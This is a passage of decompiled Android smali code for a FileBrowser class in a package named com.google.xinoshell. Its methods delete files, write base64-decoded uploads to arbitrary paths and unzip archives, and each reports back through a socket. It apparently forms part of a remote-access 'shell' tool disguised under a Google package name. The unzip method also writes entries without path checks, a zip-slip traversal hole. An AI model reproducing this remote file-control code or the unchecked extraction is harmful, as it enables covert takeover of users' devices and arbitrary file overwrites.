    .line 228
    const-string v2, "file_delete_result"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 229
    .end local v1    # "out":Lorg/json/JSONObject;
    goto :goto_end_d

    .line 231
    :cond_missing
    invoke-virtual {v0}, Ljava/io/File;->isDirectory()Z

    move-result v1

    .line 232
    .local v1, "isDir":Z
    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    move-result v2

    .line 233
    .local v2, "ok":Z
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 234
    .local v3, "out":Lorg/json/JSONObject;
    const-string v4, "socketId"

    invoke-virtual {v3, v4, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 235
    const-string v4, "path"

    invoke-virtual {v3, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 236
    const-string v4, "deleted"

    invoke-virtual {v3, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 237
    const-string v4, "isDir"

    invoke-virtual {v3, v4, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 238
    const-string v4, "file_delete_result"

    invoke-direct {p0, v4, v3}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 239
    .end local v1    # "isDir":Z
    .end local v2    # "ok":Z
    .end local v3    # "out":Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_end_d

    .line 242
    :catch_0
    move-exception v0

    .line 243
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "FileBrowser"

    const-string v2, "deleteFile error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 244
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 245
    .local v1, "errObj":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 246
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 247
    const-string v2, "deleted"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 248
    const-string v2, "error"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 249
    const-string v2, "file_delete_result"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 250
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v1    # "errObj":Lorg/json/JSONObject;
    :goto_end_d
    return-void
.end method

.method public uploadFile(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p1, "base64Data"    # Ljava/lang/String;
    .param p2, "remotePath"    # Ljava/lang/String;
    .param p3, "socketId"    # Ljava/lang/String;

    .line 270
    const/4 v6, 0x0

    .line 271
    .local v6, "flags":I
    invoke-static {p1, v6}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v0

    .line 272
    .local v0, "data":[B
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 273
    .local v1, "f":Ljava/io/File;
    :try_start_0
    invoke-virtual {v1}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v2

    .line 274
    .local v2, "parent":Ljava/io/File;
    if-eqz v2, :cond_skip_mkdir

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_skip_mkdir

    invoke-virtual {v2}, Ljava/io/File;->mkdirs()Z

    .line 275
    :cond_skip_mkdir
    new-instance v3, Ljava/io/FileOutputStream;

    invoke-direct {v3, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 276
    .local v3, "fos":Ljava/io/FileOutputStream;
    invoke-virtual {v3, v0}, Ljava/io/FileOutputStream;->write([B)V

    .line 277
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    .line 278
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 279
    .local v4, "out":Lorg/json/JSONObject;
    const-string v5, "socketId"

    invoke-virtual {v4, v5, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 280
    const-string v5, "path"

    invoke-virtual {v4, v5, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 281
    const-string v5, "uploaded"

    const/4 v6, 0x1

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 282
    const-string v5, "size"

    array-length v6, v0

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 283
    const-string v5, "file_upload_result"

    invoke-direct {p0, v5, v4}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 284
    .end local v2    # "parent":Ljava/io/File;
    .end local v3    # "fos":Ljava/io/FileOutputStream;
    .end local v4    # "out":Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_end_u

    .line 287
    :catch_0
    move-exception v2

    .line 288
    .local v2, "e":Ljava/lang/Exception;
    const-string v3, "FileBrowser"

    const-string v4, "uploadFile error"

    invoke-static {v3, v4, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 289
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 290
    .local v3, "errObj":Lorg/json/JSONObject;
    const-string v4, "socketId"

    invoke-virtual {v3, v4, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 291
    const-string v4, "path"

    invoke-virtual {v3, v4, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 292
    const-string v4, "uploaded"

    const/4 v5, 0x0

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 293
    const-string v4, "error"

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 294
    const-string v4, "file_upload_result"

    invoke-direct {p0, v4, v3}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 295
    .end local v2    # "e":Ljava/lang/Exception;
    .end local v3    # "errObj":Lorg/json/JSONObject;
    :goto_end_u
    return-void
.end method

.method public unzipFile(Ljava/lang/String;Ljava/lang/String;)V
    .locals 13
    .param p1, "path"    # Ljava/lang/String;
    .param p2, "socketId"    # Ljava/lang/String;

    const-string v0, "xinoshell"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "FB unzipFile path=["

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "] sid="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 300
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 301
    .local v0, "zipFile":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->getCanonicalPath()Ljava/lang/String;

    move-result-object v8

    new-instance v9, Ljava/io/File;

    invoke-direct {v9, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v0, v9

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_unzip_missing

    .line 302
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 303
    .local v1, "out0":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 304
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 305
    const-string v2, "unzipped"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 306
    const-string v2, "error"

    const-string v3, "File not found"

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 307
    const-string v2, "unzip_result"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 308
    goto :goto_end_unzip

    .line 311
    :cond_unzip_missing
    invoke-virtual {v0}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v5

    .line 312
    .local v5, "parent":Ljava/io/File;
    new-instance v6, Ljava/util/zip/ZipInputStream;

    .line 313
    new-instance v7, Ljava/io/FileInputStream;

    invoke-direct {v7, v0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v6, v7}, Ljava/util/zip/ZipInputStream;-><init>(Ljava/io/InputStream;)V

    .line 314
    .local v6, "zis":Ljava/util/zip/ZipInputStream;
    const/4 v8, 0x0

    .line 315
    .local v8, "extracted":I
    :goto_unzip_0
    invoke-virtual {v6}, Ljava/util/zip/ZipInputStream;->getNextEntry()Ljava/util/zip/ZipEntry;

    move-result-object v9

    if-eqz v9, :cond_unzip_done

    .line 316
    new-instance v10, Ljava/io/File;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "/"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v9}, Ljava/util/zip/ZipEntry;->getName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 317
    .local v10, "outFile":Ljava/io/File;
    invoke-virtual {v9}, Ljava/util/zip/ZipEntry;->isDirectory()Z

    move-result v11

    if-eqz v11, :cond_unzip_entry_file

    .line 318
    invoke-virtual {v10}, Ljava/io/File;->mkdirs()Z

    .line 319
    goto :goto_unzip_next

    .line 321
    :cond_unzip_entry_file
    invoke-virtual {v10}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v11

    if-eqz v11, :cond_unzip_no_parent

    invoke-virtual {v10}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v11

    invoke-virtual {v11}, Ljava/io/File;->mkdirs()Z

    .line 322
    :cond_unzip_no_parent
    new-instance v11, Ljava/io/FileOutputStream;

    invoke-direct {v11, v10}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 323
    .local v11, "fos":Ljava/io/FileOutputStream;
    const/16 v12, 0x800

    new-array v3, v12, [B

    .line 324
    .local v3, "buf":[B
    :goto_unzip_read
    invoke-virtual {v6, v3}, Ljava/util/zip/ZipInputStream;->read([B)I

    move-result v12

    if-lez v12, :cond_unzip_eof

    .line 325
    const/4 v4, 0x0

    invoke-virtual {v11, v3, v4, v12}, Ljava/io/FileOutputStream;->write([BII)V

    goto :goto_unzip_read

    .line 326
    :cond_unzip_eof
    invoke-virtual {v11}, Ljava/io/FileOutputStream;->close()V

    .line 327
    .end local v3    # "buf":[B
    .end local v11    # "fos":Ljava/io/FileOutputStream;
    add-int/lit8 v8, v8, 0x1

    .line 328
    :goto_unzip_next
    invoke-virtual {v6}, Ljava/util/zip/ZipInputStream;->closeEntry()V

    .end local v10    # "outFile":Ljava/io/File;
    goto :goto_unzip_0

    .line 330
    :cond_unzip_done
    invoke-virtual {v6}, Ljava/util/zip/ZipInputStream;->close()V

    .line 331
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 332
    .local v3, "out":Lorg/json/JSONObject;
    const-string v4, "socketId"

    invoke-virtual {v3, v4, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 333
    const-string v4, "path"

    invoke-virtual {v3, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 334
    const-string v4, "unzipped"

    const/4 v6, 0x1

    invoke-virtual {v3, v4, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 335
    const-string v4, "files"

    invoke-virtual {v3, v4, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 336
    const-string v4, "unzip_result"

    invoke-direct {p0, v4, v3}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 337
    goto :goto_end_unzip

    .line 340
    .end local v3    # "out":Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_unzip

    goto :goto_end_unzip

    .line 341
    :catch_unzip
    move-exception v0

    .line 342
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "FileBrowser"

    const-string v2, "unzipFile error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 343
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 344
    .local v1, "errObj":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 345
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 346
    const-string v2, "unzipped"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 347
    const-string v2, "error"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 348
    const-string v2, "unzip_result"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 349
    .end local v1    # "errObj":Lorg/json/JSONObject;
    :goto_end_unzip
    return-void
.end method
